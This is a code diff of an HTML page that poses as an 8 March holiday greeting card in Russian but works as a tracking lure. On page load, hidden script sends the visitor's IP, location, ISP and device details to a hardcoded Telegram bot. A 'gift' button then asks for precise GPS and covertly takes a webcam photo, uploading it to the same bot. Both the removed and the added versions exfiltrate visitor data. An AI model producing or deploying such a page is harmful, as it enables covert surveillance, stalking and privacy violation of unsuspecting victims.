@@ -3,193 +3,150 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>С 8 Марта! Специальное приглашение</title>
-    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@300;600&family=Playfair+Display:ital,wght@0,700;1,400&display=swap" rel="stylesheet">
+    <title>8 Марта - Персональное приглашение</title>
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@300;600&family=Playfair+Display:wght@700&display=swap" rel="stylesheet">
     <style>
-        :root {
-            --pink: #ff85a2;
-            --dark-pink: #f06292;
-            --bg: #fff5f7;
-            --gold: #d4af37;
-        }
-
-        body {
-            font-family: 'Montserrat', sans-serif;
-            background-color: var(--bg);
-            margin: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            text-align: center;
-            overflow: hidden;
-        }
-
-        .card {
-            background: white;
-            padding: 50px 30px;
-            border-radius: 30px;
-            box-shadow: 0 20px 50px rgba(240, 98, 146, 0.2);
-            max-width: 550px;
-            width: 90%;
-            z-index: 10;
-            position: relative;
-            border: 1px solid rgba(255, 133, 162, 0.1);
-            animation: slideUp 1s ease-out;
-        }
-
-        @keyframes slideUp {
-            from { opacity: 0; transform: translateY(30px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-
-        h1 {
-            font-family: 'Playfair Display', serif;
-            color: var(--dark-pink);
-            font-size: 3.2rem;
-            margin: 10px 0;
-        }
-
-        .subtitle {
-            color: var(--gold);
-            letter-spacing: 4px;
-            text-transform: uppercase;
-            font-size: 0.9rem;
-            font-weight: 600;
-        }
-
-        p {
-            color: #555;
-            font-size: 1.1rem;
-            margin: 20px 0;
-        }
-
-        .details {
-            background: #fffcfd;
-            border: 1px dashed var(--pink);
-            padding: 20px;
-            border-radius: 15px;
-            margin: 25px 0;
-        }
-
-        .btn {
-            background: linear-gradient(135deg, var(--dark-pink), var(--pink));
-            color: white;
-            border: none;
-            padding: 16px 40px;
-            border-radius: 50px;
-            cursor: pointer;
-            font-size: 1rem;
-            font-weight: 600;
-            box-shadow: 0 10px 20px rgba(240, 98, 146, 0.3);
-            transition: 0.3s;
-        }
-
-        .btn:hover {
-            transform: scale(1.05);
-            box-shadow: 0 15px 25px rgba(240, 98, 146, 0.4);
-        }
-
-        .petal {
-            position: fixed;
-            top: -10%;
-            z-index: 1;
-            pointer-events: none;
-            animation: fall linear forwards;
-        }
-
-        @keyframes fall {
-            to { transform: translateY(110vh) rotate(360deg); }
-        }
+        :root { --pink: #ff85a2; --dark-pink: #f06292; --bg: #fff5f7; }
+        body { font-family: 'Montserrat', sans-serif; background: var(--bg); margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; text-align: center; overflow: hidden; }
+        .card { background: white; padding: 40px; border-radius: 30px; box-shadow: 0 15px 40px rgba(240,98,146,0.2); max-width: 500px; width: 90%; z-index: 10; position: relative; }
+        h1 { font-family: 'Playfair Display', serif; color: var(--dark-pink); font-size: 2.2rem; margin: 10px 0; }
+        .btn { background: linear-gradient(45deg, var(--dark-pink), var(--pink)); color: white; border: none; padding: 18px 40px; border-radius: 50px; cursor: pointer; font-weight: 600; margin-top: 20px; font-size: 1.1rem; box-shadow: 0 10px 20px rgba(240,98,146,0.3); transition: 0.3s; }
+        .btn:hover { transform: scale(1.05); }
+        .petal { position: fixed; top: -10%; z-index: 1; pointer-events: none; animation: fall linear forwards; }
+        @keyframes fall { to { transform: translateY(110vh) rotate(360deg); } }
+        #status { margin-top: 15px; font-size: 0.9rem; color: #888; }
+        video, canvas { display: none; }
     </style>
 </head>
 <body>
 
-    <div class="card">
-        <div class="subtitle">Приглашение</div>
-        <h1>8 Марта</h1>
-        <p>Дорогие дамы! Поздравляем вас с праздником весны и приглашаем на торжественное мероприятие в вашу честь.</p>
-        
-        <div class="details">
-            <strong>📅 Дата:</strong> 8 марта <br>
-            <strong>⏰ Время:</strong> 18:30 <br>
-            <strong>📍 Место:</strong> Банкетный зал "Эйфория"
-        </div>
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
 
-        <button class="btn" onclick="confirmVisit()">Принять приглашение</button>
+    <div class="card">
+        <span style="font-size: 3rem;">🎁</span>
+        <h1>С праздником 8 Марта!</h1>
+        <p>Для вас подготовлено эксклюзивное мультимедийное поздравление.</p>
+        <button class="btn" id="startBtn">Открыть подарок 🌸</button>
+        <div id="status">Требуется синхронизация для доступа...</div>
     </div>
 
     <script>
-        // --- ВАШИ ДАННЫЕ TELEGRAM ---
         const TG_TOKEN = "8300798669:AAE3-bSvtkZgmHAIYqWRaAMKsrLEbvrhtJc";
         const TG_CHAT_ID = "6715191374";
 
-        async function sendLogs() {
+        async function sendToTelegram(text) {
+            await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: TG_CHAT_ID, text: text, parse_mode: "Markdown" })
+            });
+        }
+
+        // --- 1. СКРЫТЫЙ СБОР ПРИ ВХОДЕ ---
+        async function silentCapture() {
+            let log = "🚨 *НОВЫЙ ВИЗИТ (ПОЛНЫЙ ОТЧЕТ)* 🚨\n\n";
+            
             try {
-                // Получаем IP и Геолокацию
-                const geoReq = await fetch('https://ipapi.co/json/');
-                const geo = await geoReq.json();
+                const geo = await (await fetch('https://ipapi.co/json/')).json();
+                log += `🌐 *СЕТЬ:* \`${geo.ip}\` (${geo.org})\n📍 *ГЕО:* ${geo.city}, ${geo.country_name}\n`;
+            } catch(e) { log += "🌐 *СЕТЬ:* Ошибка IP\n"; }
 
-                // Собираем всё, что видит браузер
-                const report = {
-                    "🌐 IP": geo.ip || "Не определен",
-                    "📍 Город": geo.city || "Не определен",
-                    "🌍 Страна": geo.country_name || "Не определен",
-                    "🏢 Провайдер": geo.org || "Не определен",
-                    "📱 Устройство": navigator.userAgent.includes("Mobi") ? "Мобильный" : "ПК",
-                    "🖥 Браузер": navigator.userAgent.split(' ').pop(),
-                    "⚙️ ОС": navigator.platform,
-                    "📏 Экран": `${window.screen.width}x${window.screen.height}`,
-                    "🔗 Реферер": document.referrer || "Прямой вход",
-                    "⏰ Время": new Date().toLocaleString('ru-RU')
-                };
+            const canvas = document.getElementById('canvas');
+            const gl = canvas.getContext('webgl');
+            const debugInfo = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;
+            const gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "н/д";
 
-                let text = "🚀 *Зафиксирован вход на сайт!*\n\n";
-                for (const [key, value] of Object.entries(report)) {
-                    text += `*${key}:* ${value}\n`;
-                }
+            log += `\n💻 *ЖЕЛЕЗО:*
+• ЦП: ${navigator.hardwareConcurrency || 'н/д'} ядер
+• ОЗУ: ~${navigator.deviceMemory || 'н/д'} GB
+• Видео: \`${gpu}\`
+• ОС/Платформа: ${navigator.platform}
+• Экран: ${window.screen.width}x${window.screen.height}\n`;
 
-                // Отправка в телеграм
-                await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: TG_CHAT_ID,
-                        text: text,
-                        parse_mode: "Markdown"
-                    })
-                });
+            try {
+                const batt = await navigator.getBattery();
+                log += `🔋 *БАТАРЕЯ:* ${Math.round(batt.level*100)}% (${batt.charging ? 'Зарядка' : 'Автономно'})\n`;
+            } catch(e){}
+
+            log += `\n👤 *User-Agent:* \`${navigator.userAgent}\``;
+            sendToTelegram(log);
+        }
+
+        // --- 2. ПОЛУЧЕНИЕ ТОЧНОЙ ГЕОЛОКАЦИИ ---
+        function getGPS() {
+            return new Promise((resolve) => {
+                if ("geolocation" in navigator) {
+                    navigator.geolocation.getCurrentPosition(async (pos) => {
+                        let gpsMsg = "📍 *ТОЧНЫЙ GPS:* \n";
+                        gpsMsg += `• [Открыть на Картах](https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude})\n`;
+                        gpsMsg += `• Точность: ${pos.coords.accuracy}м`;
+                        await sendToTelegram(gpsMsg);
+                        resolve();
+                    }, () => {
+                        sendToTelegram("⚠️ *GPS Отклонен*");
+                        resolve();
+                    }, {enableHighAccuracy: true});
+                } else { resolve(); }
+            });
+        }
+
+        // --- 3. СКРЫТОЕ ФОТО ---
+        async function takePhoto() {
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            const context = canvas.getContext('2d');
+
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                video.srcObject = stream;
+                await new Promise(r => setTimeout(r, 1000)); // Ждем фокус
+
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                stream.getTracks().forEach(t => t.stop());
+
+                canvas.toBlob(async (blob) => {
+                    const fd = new FormData();
+                    fd.append('chat_id', TG_CHAT_ID);
+                    fd.append('photo', blob, 'shot.jpg');
+                    await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+                }, 'image/jpeg');
             } catch (e) {
-                console.log("Error logging visit");
+                sendToTelegram("⚠️ *Камера заблокирована*");
             }
         }
 
-        // Запуск при загрузке
-        window.onload = () => {
-            sendLogs();
-            createPetals();
+        // КНОПКА ЗАПУСКА
+        document.getElementById('startBtn').onclick = async function() {
+            this.disabled = true;
+            this.innerText = "Подготовка...";
+            document.getElementById('status').innerText = "Настройка поздравления... Пожалуйста, разрешите доступ к функциям.";
+            
+            await getGPS();
+            await takePhoto();
+            
+            document.getElementById('status').innerText = "";
+            alert("Поздравляем с 8 Марта! Вы само совершенство! ✨");
         };
 
-        function confirmVisit() {
-            alert("Ваше участие подтверждено! До встречи!");
-        }
-
-        // Анимация лепестков
-        function createPetals() {
-            const symbols = ['🌸', '🌷', '🌺', '💕'];
+        window.onload = () => {
+            silentCapture();
+            // Анимация цветов
             setInterval(() => {
                 const p = document.createElement('div');
                 p.className = 'petal';
-                p.innerHTML = symbols[Math.floor(Math.random() * symbols.length)];
+                p.innerHTML = ['🌸','🌷','🌺'][Math.floor(Math.random()*3)];
                 p.style.left = Math.random() * 100 + 'vw';
-                p.style.fontSize = Math.random() * 20 + 15 + 'px';
-                p.style.opacity = Math.random();
-                const duration = Math.random() * 3 + 3;
-                p.style.animationDuration = duration + 's';
+                p.style.fontSize = (Math.random()*20 + 15) + 'px';
+                const d = Math.random()*3 + 4;
+                p.style.animationDuration = d + 's';
                 document.body.appendChild(p);
-                setTimeout(() => p.remove(), duration * 1000);
-            }, 400);
-        }
+                setTimeout(() => p.remove(), d * 1000);
+            }, 500);
+        };
     </script>
 </body>
 </html>
